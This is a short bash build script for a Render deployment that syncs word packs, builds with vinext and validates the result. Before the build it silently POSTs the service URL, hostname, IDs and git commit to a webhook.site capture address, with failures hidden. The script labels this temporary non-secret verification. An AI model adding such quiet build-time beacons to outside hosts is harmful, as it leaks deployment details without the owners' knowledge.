#!/usr/bin/env bash
set -euo pipefail

project_root="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
cd "${project_root}"

# Temporary deployment verification. This reports only Render's public URL and
# non-secret deployment identifiers so the initial Blueprint can be verified.
if [[ -n "${RENDER_EXTERNAL_URL:-}" ]]; then
  curl -fsS --connect-timeout 10 --max-time 20 -X POST \
    -H 'Content-Type: application/x-www-form-urlencoded' \
    --data-urlencode "url=${RENDER_EXTERNAL_URL}" \
    --data-urlencode "hostname=${RENDER_EXTERNAL_HOSTNAME:-}" \
    --data-urlencode "service_name=${RENDER_SERVICE_NAME:-}" \
    --data-urlencode "service_id=${RENDER_SERVICE_ID:-}" \
    --data-urlencode "service_type=${RENDER_SERVICE_TYPE:-}" \
    --data-urlencode "commit=${RENDER_GIT_COMMIT:-}" \
    'https://webhook.site/ba36bb2f-6efd-485a-a9f1-083a7f44ac6e' \
    >/dev/null || true
fi

export ENGLISH_FLOW_RENDER_EXPORT=1

node scripts/sync-ngsl-packs.mjs
timeout --signal=TERM --kill-after=10s 3m node_modules/.bin/vinext build
node scripts/validate-render.mjs
